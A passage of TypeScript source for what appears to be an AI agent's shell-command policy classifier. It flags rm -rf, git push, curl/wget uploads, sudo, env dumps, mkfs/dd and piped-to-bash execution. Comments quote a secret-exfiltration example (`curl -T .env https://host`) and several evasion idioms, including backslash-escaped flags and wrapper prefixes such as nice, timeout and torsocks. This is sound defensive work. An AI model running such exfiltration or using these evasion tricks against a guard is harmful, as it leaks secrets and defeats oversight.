    return { target: command.slice(index, end), nextIndex: end };
  };

  for (let index = 0; index < command.length; index += 1) {
    const char = command[index]!;
    if (escaped) {
      escaped = false;
      continue;
    }
    if (char === "\\") {
      escaped = true;
      continue;
    }
    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote;
      continue;
    }
    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote;
      continue;
    }
    if (inSingleQuote || inDoubleQuote) continue;

    let operatorStart = index;
    while (/\d/u.test(command[operatorStart]!)) operatorStart += 1;
    const startsFdRedirect = operatorStart > index && command[operatorStart] === ">";
    const startsPlainRedirect = char === ">";
    const startsAmpersandRedirect = char === "&" && command[index + 1] === ">";
    if (!startsFdRedirect && !startsPlainRedirect && !startsAmpersandRedirect) continue;

    let operatorEnd = startsAmpersandRedirect ? index + 2 : operatorStart + 1;
    if (command[operatorEnd] === ">") operatorEnd += 1;
    if (command[operatorEnd] === "|") operatorEnd += 1;
    if (command[operatorEnd] === "&") {
      index = operatorEnd;
      continue;
    }
    const { target, nextIndex } = readTarget(operatorEnd);
    if (target !== undefined && target !== "") targets.push(target);
    index = Math.max(index, nextIndex - 1);
  }

  return targets;
}

const PROCESS_OUTPUT_REDIRECT_SINKS = new Set([
  "/dev/null",
  "/dev/stdout",
  "/dev/stderr",
  "/dev/fd/1",
  "/dev/fd/2",
]);

function isProcessOutputRedirectSink(
  rawPath: string,
  basePath: string,
  env: NodeJS.ProcessEnv,
): boolean {
  const normalized = normalizePathTarget(rawPath, basePath, env);
  return PROCESS_OUTPUT_REDIRECT_SINKS.has(normalized);
}

function pushRedirectSegments(
  segments: SideEffectSegmentT[],
  command: string,
  basePath: string,
  env: NodeJS.ProcessEnv,
  workspaceRoot = basePath,
): void {
  for (const rawTarget of redirectWriteTargets(command)) {
    const token = stripShellPathToken(rawTarget);
    if (token === "") continue;
    if (isProcessOutputRedirectSink(token, basePath, env)) continue;
    pushFileWriteSegment(segments, token, basePath, env, workspaceRoot);
  }
}

function rmTargets(argv: readonly string[]): string[] {
  const targets: string[] = [];
  let optionsEnded = false;
  for (const arg of argv.slice(1)) {
    if (!optionsEnded && arg === "--") {
      optionsEnded = true;
      continue;
    }
    if (!optionsEnded && arg !== "-" && arg.startsWith("-")) continue;
    targets.push(arg);
  }
  return targets;
}

function rmOptionArgs(argv: readonly string[]): readonly string[] {
  const end = argv.indexOf("--");
  return argv.slice(1, end === -1 ? undefined : end);
}

function rmIsRecursiveForce(argv: readonly string[]): boolean {
  const options = rmOptionArgs(argv);
  const recursive = options.some(
    (arg) =>
      arg === "--recursive" ||
      (arg.startsWith("-") && !arg.startsWith("--") && /[rR]/u.test(arg.slice(1))),
  );
  const force = options.some(
    (arg) =>
      arg === "--force" ||
      (arg.startsWith("-") && !arg.startsWith("--") && arg.slice(1).includes("f")),
  );
  return recursive && force;
}

function pushRmSegment(
  segments: SideEffectSegmentT[],
  argv: readonly string[],
  basePath: string,
  env: NodeJS.ProcessEnv,
  workspaceRoot = basePath,
  options: { readonly workspaceTrusted: boolean; readonly realpath?: (path: string) => string } = {
    workspaceTrusted: false,
  },
): void {
  if (argv[0] !== "rm" || argv.at(-1) === undefined) return;
  const targets = rmTargets(argv);
  const modifiers: Array<"destructive" | "irreversible"> = rmIsRecursiveForce(argv)
    ? ["destructive", "irreversible"]
    : ["destructive"];
  for (const rawTarget of targets) {
    const target = destructivePathTarget(
      stripShellPathToken(rawTarget),
      basePath,
      env,
      workspaceRoot,
      options,
    );
    segments.push(
      segment({
        effectKinds: ["fs_write"],
        scopes: [pathScope(target.normalized!, workspaceRoot, env)],
        targets: [target],
        modifiers,
      }),
    );
  }
}

function pushGitPushSegment(segments: SideEffectSegmentT[], argv: readonly string[]): void {
  if (argv[0] !== "git" || argv[1] !== "push") return;
  const modifiers = argv.some(
    (arg) => arg === "--delete" || arg === "--force" || arg.startsWith("--force-"),
  )
    ? (["irreversible"] as const)
    : ([] as const);
  segments.push(
    segment({
      effectKinds: ["process_exec", "network_write"],
      scopes: ["process", "external_service"],
      targets: [commandTarget("git push")],
      modifiers: [...modifiers],
    }),
  );
}

function gitRemoteHost(value: string | undefined): string | null {
  if (value === undefined) return null;
  const ssh = /^git@([^:]+):/u.exec(value);
  if (ssh !== null) return ssh[1]!.toLowerCase();
  try {
    return new URL(value).hostname.toLowerCase();
  } catch {
    return null;
  }
}

function pushGitRemoteMutationSegment(
  segments: SideEffectSegmentT[],
  argv: readonly string[],
): void {
  if (argv[0] !== "git" || argv[1] !== "remote" || !["add", "set-url"].includes(argv[2] ?? "")) {
    return;
  }
  const host = gitRemoteHost(argv.at(-1));
  segments.push(
    segment({
      effectKinds: ["fs_write", "process_exec"],
      scopes: ["workspace", "process"],
      targets: [
        commandTarget(`git remote ${argv[2] ?? "unknown"}`),
        ...(host === null ? [] : [hostTarget(host)]),
      ],
      modifiers: ["persistent"],
    }),
  );
}

function pushPackageInstallSegment(segments: SideEffectSegmentT[], argv: readonly string[]): void {
  const npm = argv[0] === "npm" && ["install", "i", "add"].includes(argv[1] ?? "");
  const pnpm = argv[0] === "pnpm" && ["install", "add"].includes(argv[1] ?? "");
  const yarn = argv[0] === "yarn" && ["add", "install"].includes(argv[1] ?? "");
  const pip = ["pip", "pip3"].includes(argv[0] ?? "") && argv[1] === "install";
  if (!npm && !pnpm && !yarn && !pip) return;
  const packageName =
    argv.find((arg, index) => index > 1 && !arg.startsWith("-") && !arg.startsWith("http")) ??
    "unknown";
  segments.push(
    segment({
      effectKinds: ["process_exec", "network_read", "fs_write"],
      scopes: ["process", "external_service", "workspace"],
      targets: [packageTarget(packageName)],
      modifiers: [],
    }),
  );
}

function stripTrailingUrlPunctuation(value: string): string {
  return value.replace(/[),.;]+$/u, "");
}

function firstHttpHost(command: string): string | undefined {
  for (const match of command.matchAll(POLICY_HTTP_URL)) {
    const token = stripTrailingUrlPunctuation(match[0] ?? "");
    if (token === "") continue;
    try {
      const host = new URL(token).hostname.toLowerCase();
      if (host !== "") return host;
    } catch {
      // Invalid URL-shaped tokens stay on the fallback/review path.
    }
  }
  return undefined;
}

// A curl/wget request is a network WRITE when it names a state-changing method or carries a body.
// The prior `\b-X` form (QC §2) was dead: a space precedes `-X`, and space→`-` is not a word
// boundary, so `curl -X POST …` was misclassified `network_read` (wrong audit + skipped POL-006).
// The body alternation lists curl's real data flags only, so a look-alike like `--data-dir` (not a
// curl flag) does not falsely count as a body.
const HTTP_WRITE_METHOD_RE = /(?:^|\s)(?:-X|--request)[\s=]*(?:POST|PUT|PATCH|DELETE)\b/iu;
const HTTP_REQUEST_BODY_RE =
  /(?:^|\s)(?:-d|--data(?:-(?:ascii|binary|raw|urlencode))?)(?:[\s=@]|$)/iu;

function pushExplicitEgressSegment(segments: SideEffectSegmentT[], command: string): void {
  const host = firstHttpHost(command);
  if (host === undefined) return;
  // Only treat method/body flags as a write for an actual curl/wget invocation, so another tool's
  // own `-d`/`-X` before an http URL (e.g. `grep -d skip https://…`) is not a false network write.
  // Resolve past exec-launcher wrappers (F1) and test the method/body over the *dequoted* client argv
  // (F2), re-joining its tokens so the existing method/body regexes keep their tested semantics but a
  // wrapper prefix or a quoted `"-X"` can no longer hide the write.
  const clientArgv = resolveHttpClientArgv(argvFromCommand(command));
  const isHttpClient = clientArgv.length > 0;
  const normalizedClient = clientArgv.map(normalizeFlagToken).join(" ");
  const isWrite =
    isHttpClient &&
    (HTTP_WRITE_METHOD_RE.test(normalizedClient) || HTTP_REQUEST_BODY_RE.test(normalizedClient));
  segments.push(
    segment({
      effectKinds: ["process_exec", isWrite ? "network_write" : "network_read"],
      scopes: ["process", "external_service"],
      targets: [commandTarget(command), hostTarget(host)],
      modifiers: [],
    }),
  );
}

// QC §1 (must-fix): curl/wget flags whose operand is a file READ from disk and shipped in the
// request body/upload. Without modeling this read, an exfiltration like `curl -T .env https://host`
// emitted no secret `fs_read` segment, so POL-001 never fired and the verdict was `allow`.
const CURL_UPLOAD_FILE_FLAGS = new Set(["-T", "--upload-file"]);
const CURL_DATA_VALUE_FLAGS = new Set([
  "-d",
  "--data",
  "--data-ascii",
  "--data-binary",
  "--data-raw",
  "--data-urlencode",
  "-F",
  "--form",
]);
const WGET_UPLOAD_FILE_FLAGS = new Set(["--post-file", "--body-file"]);

const HTTP_CLIENT_COMMANDS = new Set(["curl", "wget"]);

// Transparent exec-launcher wrappers that exec their trailing command argv unchanged
// (`nice curl …`, `timeout 5 curl …`, `nohup curl …`). The upload/egress gate must resolve *past*
// them: anchoring classification on argv[0] alone let any wrapper hide the real curl/wget and
// re-opened the exfiltration §1 closes (QC-2026-07-11 round-2, F1). We deliberately do NOT model
// each wrapper's private option grammar — `resolveHttpClientArgv` skips wrapper tokens, their flags,
// and flag/operand noise until the first curl/wget, stopping at the first genuine non-wrapper command
// word so a sibling command (`echo curl …`, `grep -e curl …`) is never mistaken for a curl call.
const EXEC_LAUNCHER_WRAPPERS = new Set([
  "nice",
  "nohup",
  "setsid",
  "ionice",
  "taskset",
  "chrt",
  "timeout",
  "flock",
  "time",
  "watch",
  "stdbuf",
  "unbuffer",
  "catchsegv",
  "proxychains",
  "proxychains4",
  "nocache",
  "eatmydata",
  "xargs",
  "numactl",
  "setarch",
  "cpulimit",
  "torsocks",
  "daemonize",
  "runuser",
  "setpriv",
  "nsenter",
  "unshare",
  "systemd-run",
  "arch",
  "strace",
  "ltrace",
  "ssh-agent",
  "firejail",
  "bwrap",
  "chroot",
]);

// The final path segment of argv[0] (`/usr/bin/curl` → `curl`), after stripping shell quoting and
// a leading `\` (the canonical alias-bypass idiom — `\curl` runs the real binary).
function commandBasename(cmd: string | undefined): string {
  if (cmd === undefined) return "";
  let cleaned = stripShellPathToken(cmd);
  if (cleaned.startsWith("\\")) cleaned = cleaned.slice(1);
  const slash = cleaned.lastIndexOf("/");
  return slash >= 0 ? cleaned.slice(slash + 1) : cleaned;
}

// Resolve the real command by skipping leading `NAME=VALUE` env assignments and `command` /
// `env` (+ `/usr/bin/env`) wrappers, so an upload behind a prefix (`env curl …`, `X=1 curl …`)
// is still modeled. Env's own options and inline assignments (incl. `-u NAME`) are dropped.
function effectiveCommandArgv(argv: readonly string[]): readonly string[] {
  let i = 0;
  const isAssignment = (t: string): boolean => /^[A-Za-z_][A-Za-z0-9_]*=/u.test(t);
  while (i < argv.length && isAssignment(argv[i]!)) i += 1;
  while (i < argv.length) {
    const base = commandBasename(argv[i]);
    if (base === "command") {
      i += 1;
      continue;
    }
    if (base === "env") {
      i += 1;
      while (i < argv.length) {
        const t = argv[i]!;
        if (t === "--") {
          i += 1;
          break;
        }
        if (t === "-u" || t === "--unset") {
          i += 2;
          continue;
        }
        if (t.startsWith("-") || isAssignment(t)) {
          i += 1;
          continue;
        }
        break;
      }
      continue;
    }
    break;
  }
  return argv.slice(i);
}

// Resolve the curl/wget invocation inside a (pipe-)part, seeing through exec-launcher wrappers so an
// upload/egress behind `nice`/`timeout`/`nohup`/… is still modeled (QC-2026-07-11 round-2, F1/F3).
// Returns the argv slice starting at the http-client token, or [] when this part is not a curl/wget
// call. Bare quoted flags are handled downstream by dequoting each token (F2).
function resolveHttpClientArgv(argv: readonly string[]): readonly string[] {
  const eff = effectiveCommandArgv(argv);
  // A separate-value flag (`-n 10`, `-s KILL`) can consume the next token as its value; a glued
  // (`-n10`) or `=`-joined (`--foo=bar`) flag does not. Tracking this stops a wrapper flag's bare-word
  // value (e.g. `timeout -s KILL …`) from being mistaken for the wrapped command.
  let prevWasSeparateFlag = false;
  for (let i = 0; i < eff.length; i += 1) {
    const raw = eff[i]!;
    const base = commandBasename(raw);
    if (HTTP_CLIENT_COMMANDS.has(base)) return eff.slice(i);
    if (EXEC_LAUNCHER_WRAPPERS.has(base)) {
      prevWasSeparateFlag = false;
      continue;
    }
    if (raw.startsWith("-")) {
      prevWasSeparateFlag = !raw.includes("=");
      continue;
    }
    if (prevWasSeparateFlag) {
      prevWasSeparateFlag = false;
      continue;
    }
    // A bare command word (letter-led, no path separator) is a genuine non-wrapper command that owns
    // this part; a curl/wget appearing later is *its* argument, not our invocation — do not resolve.
    if (/^[A-Za-z]/u.test(base) && !raw.includes("/")) return [];
    // Otherwise a wrapper positional operand (number/duration/priority/cpu-list/lock path) — skip it.
    prevWasSeparateFlag = false;
  }
  return [];
}

// Normalize a client-argv token for flag/method matching: strip surrounding shell quotes AND a single
// leading backslash. The shell removes a leading `\` before the tool runs (`\-T`/`\-X` execute exactly
// as `-T`/`-X` — the same alias-bypass idiom `commandBasename` already strips for argv[0]), so it must
// not evade upload/method detection (QC-2026-07-11 round-3 #2).
function normalizeFlagToken(token: string): string {
  const dequoted = stripShellPathToken(token);
  return dequoted.startsWith("\\") ? dequoted.slice(1) : dequoted;
}

// A curl `--data`/`-F` value reads from a file when it starts with `@`; `-F` uses
// `name=@file[;type=...]`. Returns the referenced path, or undefined for inline (non-`@`) data.
function uploadFileFromDataValue(value: string): string | undefined {
  const at = value.indexOf("@");
  if (at < 0) return undefined;
  let file = value.slice(at + 1);
  const semi = file.indexOf(";");
  if (semi >= 0) file = file.slice(0, semi);
  return file === "" ? undefined : file;
}

function uploadOperandTokens(argv: readonly string[]): string[] {
  const clientArgv = resolveHttpClientArgv(argv);
  if (clientArgv.length === 0) return [];
  // Dequote every token (and strip a leading `\`) so a quoted/escaped flag (`curl "-T" .env`,
  // `curl \-T .env`) still matches the flag sets, and a quoted operand (`"@.env"`) still resolves to
  // its path (QC round-2 F2, round-3 #2).
  const effective = clientArgv.map(normalizeFlagToken);
  const files: string[] = [];
  for (let i = 0; i < effective.length; i += 1) {
    const tok = effective[i]!;
    if (CURL_UPLOAD_FILE_FLAGS.has(tok)) {
      const next = effective[i + 1];
      if (next !== undefined) files.push(next);
      continue;
    }
    const eq = tok.indexOf("=");
    const flag = eq >= 0 ? tok.slice(0, eq) : tok;
    const glued = eq >= 0 ? tok.slice(eq + 1) : undefined;
    if (flag === "--upload-file" && glued !== undefined) {
      files.push(glued);
      continue;
    }
    if (WGET_UPLOAD_FILE_FLAGS.has(flag)) {
      if (glued !== undefined) files.push(glued);
      else {
        const next = effective[i + 1];
        if (next !== undefined) files.push(next);
      }
      continue;
    }
    if (CURL_DATA_VALUE_FLAGS.has(flag)) {
      const value = glued ?? effective[i + 1];
      if (value !== undefined) {
        const file = uploadFileFromDataValue(value);
        if (file !== undefined) files.push(file);
      }
      continue;
    }
    // Glued short forms: `-d@file`, `-Fname=@file`.
    if ((tok.startsWith("-d") || tok.startsWith("-F")) && tok.length > 2) {
      const file = uploadFileFromDataValue(tok.slice(2));
      if (file !== undefined) files.push(file);
    }
    // Glued upload file: curl accepts a glued `-T<file>` value (QC round-3 #1). The operand is a raw
    // path (not `@`-prefixed), so push it directly.
    if (tok.startsWith("-T") && tok.length > 2) {
      files.push(tok.slice(2));
    }
  }
  return files;
}

// Model each curl/wget upload operand as an `fs_read` of that path so the shared secret-sensitivity
// classifier tags it and POL-001 denies a secret upload — closing the QC §1 exfiltration gap.
function pushUploadReadSegments(
  segments: SideEffectSegmentT[],
  argv: readonly string[],
  basePath: string,
  env: NodeJS.ProcessEnv,
  workspaceRoot: string,
): void {
  for (const raw of uploadOperandTokens(argv)) {
    const token = cleanPathOperand(raw);
    if (token === undefined) continue;
    pushFileReadSegment(segments, token, basePath, env, workspaceRoot);
  }
}

const PRIVILEGE_COMMANDS = ["sudo", "su", "doas", "pkexec"] as const;

function isPrivilegeCommand(command: string): command is (typeof PRIVILEGE_COMMANDS)[number] {
  return PRIVILEGE_COMMANDS.some((entry) => entry === command);
}

function privilegeTokensInCommand(command: string): string[] {
  const result: string[] = [];
  // This embedded scan catches a privilege word used as a standalone argv token behind a wrapper
  // (`env sudo …`, `xargs sudo …`). It intentionally keeps `/` OUT of the leading boundary: a
  // path-qualified privilege *command* (`/usr/bin/sudo`) is the argv[0] of its (pipe-)part and is
  // denied by `pushPrivilegeSegment` below, whereas a path *argument* ending in a privilege word
  // (`cat /opt/su`) must NOT be denied — allowing `/` here would over-deny that benign read (QC §3).
  for (const match of command.matchAll(/(?:^|[^\w./-])(sudo|su|doas|pkexec)(?=$|[^\w./-])/gu)) {
    const token = match[1];
    if (token !== undefined && isPrivilegeCommand(token) && !result.includes(token)) {
      result.push(token);
    }
  }
  return result;
}

function pushPrivilegeSegment(segments: SideEffectSegmentT[], argv: readonly string[]): void {
  // Match the command basename (QC §3) so `/usr/bin/sudo`, `./sudo`, `\sudo` (and the same behind a
  // pipe, whose part has its own argv[0]) are denied by POL-009, not just a bare `sudo` argv[0].
  const command = commandBasename(argv[0] ?? "");
  if (!isPrivilegeCommand(command)) return;
  segments.push(
    segment({
      effectKinds: ["process_exec"],
      scopes: ["process", "system"],
      targets: [commandTarget(command)],
      modifiers: ["persistent"],
    }),
  );
}

function pushEmbeddedPrivilegeSegments(segments: SideEffectSegmentT[], command: string): void {
  for (const token of privilegeTokensInCommand(command)) {
    segments.push(
      segment({
        effectKinds: ["process_exec"],
        scopes: ["process", "system"],
        targets: [commandTarget(token)],
        modifiers: ["persistent"],
      }),
    );
  }
}

function pushEnvDumpSegment(segments: SideEffectSegmentT[], argv: readonly string[]): void {
  if (!["env", "printenv"].includes(argv[0] ?? "")) return;
  segments.push(
    segment({
      effectKinds: ["process_exec", "fs_read"],
      scopes: ["process"],
      targets: [envTarget("*")],
      modifiers: [],
    }),
  );
}

function pushDangerousSystemSegment(segments: SideEffectSegmentT[], argv: readonly string[]): void {
  const command = argv[0] ?? "";
  const ddDeviceWrite =
    command === "dd" && argv.some((arg) => arg.startsWith("of=/dev/") || arg === "of=/dev");
  if (!command.startsWith("mkfs") && !ddDeviceWrite) return;
  segments.push(
    segment({
      effectKinds: ["process_exec", "fs_write"],
      scopes: ["process", "system"],
      targets: [commandTarget(command)],
      modifiers: ["destructive"],
    }),
  );
}

function isPythonExecutable(command: string): boolean {
  return command === "python" || command === "python3" || /^python3?\.\d+$/u.test(command);
}

function firstNonOptionArg(argv: readonly string[]): string | undefined {
  for (let index = 1; index < argv.length; index += 1) {
    const arg = argv[index]!;
    if (arg === "--") return argv[index + 1];
    if (arg.startsWith("-")) continue;
    return arg;
  }
  return undefined;
}

const SAFE_MAKE_TARGETS = new Set([
  "all",
  "build",
  "check",
  "fmt",
  "format",
  "lint",
  "test",
  "tests",
  "typecheck",
]);

function isMakeExecutable(command: string): boolean {
  return command === "make" || command === "gmake";
}

function makeTargetsAreSandboxContained(argv: readonly string[]): boolean {
  const targets: string[] = [];
  for (let index = 1; index < argv.length; index += 1) {
    const arg = argv[index]!;
    if (arg === "--" || arg.startsWith("-") || arg.includes("=")) return false;
    targets.push(arg);
  }
  return (
    targets.length > 0 &&
    targets.every((target) => SAFE_MAKE_TARGETS.has(target) || target.startsWith("test-"))
  );
}

function isSafeGoPackagePattern(arg: string): boolean {
  if (arg === "." || arg === "./...") return true;
  if (!arg.startsWith("./")) return false;
  const tail = arg.slice(2);
  const path = tail.endsWith("/...") ? tail.slice(0, -4) : tail;
  if (path.length === 0) return false;
  const parts = path.split("/");
  return parts.every(
    (part) => part !== "" && part !== "." && part !== ".." && /^[\w.-]+$/u.test(part),
  );
}

function isSandboxContainedBuildRunner(argv: readonly string[]): boolean {
  const executable = argv[0] ?? "";
  if (isMakeExecutable(executable)) return makeTargetsAreSandboxContained(argv);
  if (executable === "cargo") {
    return argv.length === 2 && ["build", "check", "clippy", "fmt", "test"].includes(argv[1] ?? "");
  }
  if (executable === "go") {
    const subcommand = argv[1] ?? "";
    return (
      ["build", "fmt", "test", "vet"].includes(subcommand) &&
      argv.slice(2).every(isSafeGoPackagePattern)
    );
  }
  return false;
}

function arbitraryCodeReason(command: string, argv: readonly string[]): string | undefined {
  const executable = argv[0] ?? "";
  if (isSandboxContainedBuildRunner(argv)) return "build_runner_opaque";
  if (
    command.includes("<<") &&
    ["python", "python3", "node", "Rscript", "bash", "sh"].includes(executable)
  ) {
    return "script_heredoc_opaque";
  }
  if (isPythonExecutable(executable)) {
    if (argv.includes("-c") || argv.includes("-m")) return "script_lang_opaque";
    return firstNonOptionArg(argv) === undefined ? undefined : "script_file_opaque";
  }
  if (executable === "node") {
    if (argv.includes("-e") || argv.includes("--eval")) return "script_lang_opaque";
    return firstNonOptionArg(argv) === undefined ? undefined : "script_file_opaque";
  }
  if (executable === "Rscript") {
    if (argv.includes("-e")) return "script_lang_opaque";
    return firstNonOptionArg(argv) === undefined ? undefined : "script_file_opaque";
  }
  if (["bash", "sh", "zsh"].includes(executable)) {
    if (argv.includes("-c")) return "shell_c_opaque";
    return firstNonOptionArg(argv) === undefined ? undefined : "shell_script_opaque";
  }
  return undefined;
}

function pushArbitraryCodeSegment(
  segments: SideEffectSegmentT[],
  command: string,
  argv: readonly string[],
): boolean {
  const reason = arbitraryCodeReason(command, argv);
  if (reason === undefined) return false;
  segments.push(
    segment({
      effectKinds: ["process_exec", "unknown"],
      scopes: ["process", "unknown"],
      targets: [commandTarget(command)],
      modifiers: ["unknown"],
    }),
  );
  return true;
}

function pushCdSegment(
  segments: SideEffectSegmentT[],
  argv: readonly string[],
  basePath: string,
  env: NodeJS.ProcessEnv,
  workspaceRoot = basePath,
): CdSegmentResult {
  if (argv[0] !== "cd") return { modeled: false };
  const rawTarget = argv.find(
    (arg, index) => index > 0 && arg !== "--" && (arg === "-" || !arg.startsWith("-")),
  );
  const literalTarget = rawTarget === undefined ? undefined : stripShellPathToken(rawTarget);
  if (literalTarget === undefined || literalTarget === "" || literalTarget === "-") {
    segments.push(
      segment({
        effectKinds: ["process_exec", "unknown"],
        scopes: ["process", "unknown"],
        targets: [commandTarget(rawTarget === undefined ? "cd" : `cd ${rawTarget}`)],
        modifiers: ["unknown"],
      }),
    );
    return { modeled: true };
  }
  const target = pathTarget(literalTarget, basePath, env, workspaceRoot);
  const scope = pathScope(target.normalized!, workspaceRoot, env);
  segments.push(
    segment({
      effectKinds: ["process_exec"],
      scopes: ["process", scope],
      targets: [target],
      modifiers: target.withinWorkspace === true ? [] : ["unknown"],
    }),
  );
  return target.normalized === undefined
    ? { modeled: true }
    : { modeled: true, nextDirectory: target.normalized };
}

function pushObfuscatedExecSegment(segments: SideEffectSegmentT[], command: string): void {
  const obfuscated =
    /\bbase64\s+-d\b/u.test(command) ||
    /\bxxd\s+-r\s+-p\b/u.test(command) ||
    /\|\s*bash\b/u.test(command) ||
    /\bbash\s+<\(/u.test(command);
  if (!obfuscated) return;
  segments.push(
    segment({
      effectKinds: ["process_exec", "unknown"],
      scopes: ["process", "unknown"],
      targets: [commandTarget(command)],
      modifiers: ["unknown"],
    }),
  );
}

function knownSafeFallbackCommand(command: string, argv: readonly string[]): boolean {
  const utility = modelUtility(argv);
  if (utility !== undefined) return utility.safe;
  if (
    [
      "cat",
      "cut",
      "echo",
      "false",
      "git",
      "head",
      "ls",
      "more",
      "nl",
      "printf",
      "pwd",
      "rev",
      "tac",
      "tail",
      "true",
      "whoami",
      // F-3 RC1: read-only POSIX builtins with NO write/exec mode in any argument form (a `>` redirect
      // is modeled as a separate write segment, so command-level allow is safe). These unblock the
      // common `/loop --until "test -f X"` / `/goal --check` predicates that were POL-003 review.
      // Deliberately NOT here: `[` (any `[` token trips the conservative glob-bracket shape heuristic —
      // the equivalent `test` is classified instead), `printenv`/`env` (env-dump = secret-read surface,
      // POL-001), and `sort`/`uniq`/`date`/`tree` (write/clock modes — arg-modeled in `modelUtility`).
      "test",
      "dirname",
      "basename",
      "type",
    ].includes(argv[0] ?? "")
  ) {
    if (argv[0] !== "git") return true;
    if (["diff", "log", "show", "status"].includes(argv[1] ?? "")) return true;
    if (argv[1] !== "remote") return false;
    return (
      argv[2] === undefined || argv[2] === "-v" || argv[2] === "--verbose" || argv[2] === "get-url"
    );
  }
  if (["pnpm", "npm", "bun", "yarn"].includes(argv[0] ?? "")) {
    return ["build", "format", "lint", "test", "typecheck"].includes(argv[1] ?? "");
  }
  return extractExplicitEgressTarget(command).kind === "invalid";
}

function fallbackProcessSegment(command: string, argv: readonly string[]): SideEffectSegmentT {
  return segment({
    effectKinds: ["process_exec"],
    scopes: ["process"],
    targets: [commandTarget(command)],
    modifiers: knownSafeFallbackCommand(command, argv) ? [] : ["unknown"],
  });
}

function classifyShellPart(
  part: string,
  options: {
    readonly isCompound: boolean;
    readonly workspaceRoot: string;
    readonly basePath: string;
    readonly env: NodeJS.ProcessEnv;
    readonly workspaceTrusted: boolean;
    readonly exactTouchOperand?: string;
    readonly declaredTempRoots: readonly string[];
    readonly lstat?: (path: string) => { readonly isSymbolicLink: () => boolean };
    readonly readlink?: (path: string) => string;
    readonly realpath?: (path: string) => string;
  },
): ClassifiedShellPart {
  const argv = argvFromCommand(part);
  const segments: SideEffectSegmentT[] = [];
  const targetAwareWrite =
    options.exactTouchOperand === undefined
      ? undefined
      : targetAwareTouchWrite(options.exactTouchOperand, options.basePath, options);
  if (targetAwareWrite !== undefined) {
    segments.push(
      segment({
        effectKinds: ["fs_write"],
        scopes: [
          targetAwareWrite.target.withinWorkspace === true
            ? "workspace"
            : pathScope(targetAwareWrite.target.normalized!, options.workspaceRoot, options.env),
        ],
        targets: [targetAwareWrite.target],
        modifiers: [],
      }),
    );
  }
  const cd = pushCdSegment(segments, argv, options.basePath, options.env, options.workspaceRoot);
  const beforeRm = segments.length;
  pushRmSegment(segments, argv, options.basePath, options.env, options.workspaceRoot, {
    workspaceTrusted: options.workspaceTrusted,
    ...(options.realpath === undefined ? {} : { realpath: options.realpath }),
  });
  const rmModeled = segments.length > beforeRm;
  const beforeGitPush = segments.length;
  pushGitPushSegment(segments, argv);
  const gitPushModeled = segments.length > beforeGitPush;
  const beforeGitRemote = segments.length;
  pushGitRemoteMutationSegment(segments, argv);
  const gitRemoteModeled = segments.length > beforeGitRemote;
  const beforePackageInstall = segments.length;
  pushPackageInstallSegment(segments, argv);
  const packageInstallModeled = segments.length > beforePackageInstall;
  const beforeEgress = segments.length;
  pushExplicitEgressSegment(segments, part);
  pushUploadReadSegments(segments, argv, options.basePath, options.env, options.workspaceRoot);
  const egressModeled = segments.length > beforeEgress;
  const beforePrivilege = segments.length;
  pushPrivilegeSegment(segments, argv);
  pushEmbeddedPrivilegeSegments(segments, part);
  const privilegeModeled = segments.length > beforePrivilege;
  const beforeEnv = segments.length;
  pushEnvDumpSegment(segments, argv);
  const envModeled = segments.length > beforeEnv;
  const beforeDangerousSystem = segments.length;
  pushDangerousSystemSegment(segments, argv);
  const dangerousSystemModeled = segments.length > beforeDangerousSystem;
  const beforeArbitraryCode = segments.length;
  pushArbitraryCodeSegment(segments, part, argv);
  const arbitraryCodeModeled = segments.length > beforeArbitraryCode;
  const beforeObfuscated = segments.length;
  pushObfuscatedExecSegment(segments, part);
  const obfuscatedModeled = segments.length > beforeObfuscated;
  pushFileReadSegments(segments, part, options.basePath, options.env, options.workspaceRoot);
  pushUtilitySegments(segments, argv, options.basePath, options.env, options.workspaceRoot);
  pushRedirectReadSegments(segments, part, options.basePath, options.env, options.workspaceRoot);
  pushRedirectSegments(segments, part, options.basePath, options.env, options.workspaceRoot);

  const processModeled =
    cd.modeled ||
    rmModeled ||
    gitPushModeled ||
    gitRemoteModeled ||
    packageInstallModeled ||
    egressModeled ||
    privilegeModeled ||
    envModeled ||
    dangerousSystemModeled ||
    arbitraryCodeModeled ||
    obfuscatedModeled;
  const argvSensitiveModelInCompound =
    options.isCompound &&
    (rmModeled || gitPushModeled || gitRemoteModeled || privilegeModeled || dangerousSystemModeled);
  if (
    segments.length === 0 ||
    argvSensitiveModelInCompound ||
    (!processModeled && !knownSafeFallbackCommand(part, argv))
  ) {
    segments.push(fallbackProcessSegment(part, argv));
  }
  return {
    segments,
    modeledCd: cd.modeled,
    ...(cd.nextDirectory === undefined ? {} : { nextDirectory: cd.nextDirectory }),
    ...(targetAwareWrite === undefined ? {} : { targetAwareWrite }),
  };
}

function unknownShellSyntaxSegment(command: string): SideEffectSegmentT {
  return segment({
    effectKinds: ["process_exec", "unknown"],
    scopes: ["process", "unknown"],
    targets: [commandTarget(`unsupported-shell-syntax: ${command}`)],
    modifiers: ["unknown"],
  });
}

function shellCompositionKind(
  edges: readonly CompositionEdgeT[],
  relations: ReadonlySet<ShellRelation>,
): CompositionKindT {
  if (edges.length === 0) return "atomic";
  if (relations.size !== 1) return "mixed";
  const [relation] = [...relations];
  if (relation === "conditional") return "conditional";
  if (relation === "pipe") return "pipeline";
  if (relation === "sequence") return "sequence";
  return "mixed";
}

function edgeRelationForOperator(operator: ShellOperator | undefined): ShellRelation {
  if (operator === "and" || operator === "or") return "conditional";
  return operator ?? "unknown";
}

function classifyShellCommand(
  command: string,
  options: {
    readonly workspaceRoot: string;
    readonly env: NodeJS.ProcessEnv;
    readonly workspaceTrusted: boolean;
    readonly declaredTempRoots: readonly string[];
    readonly lstat?: (path: string) => { readonly isSymbolicLink: () => boolean };
    readonly readlink?: (path: string) => string;
    readonly realpath?: (path: string) => string;
  },
): ClassifiedShell {
  const shell = splitShellCommand(command);
  const touchOperand = exactTouchOperand(command);
  const segments: SideEffectSegmentT[] = [];
  const edges: CompositionEdgeT[] = [];
  const relations = new Set<ShellRelation>();
  let previousPartLastIndex: number | undefined;
  let basePath = options.workspaceRoot;
  let targetAwareWrite: TargetAwareWrite | undefined;

  const connect = (from: number, to: number, relation: ShellRelation): void => {
    edges.push({ from, to, relation });
    relations.add(relation);
  };

  for (let partIndex = 0; partIndex < shell.parts.length; partIndex += 1) {
    const part = shell.parts[partIndex]!;
    const firstIndex = segments.length;
    const classifiedPart = classifyShellPart(part.text, {
      isCompound: shell.parts.length > 1,
      workspaceRoot: options.workspaceRoot,
      basePath,
      env: options.env,
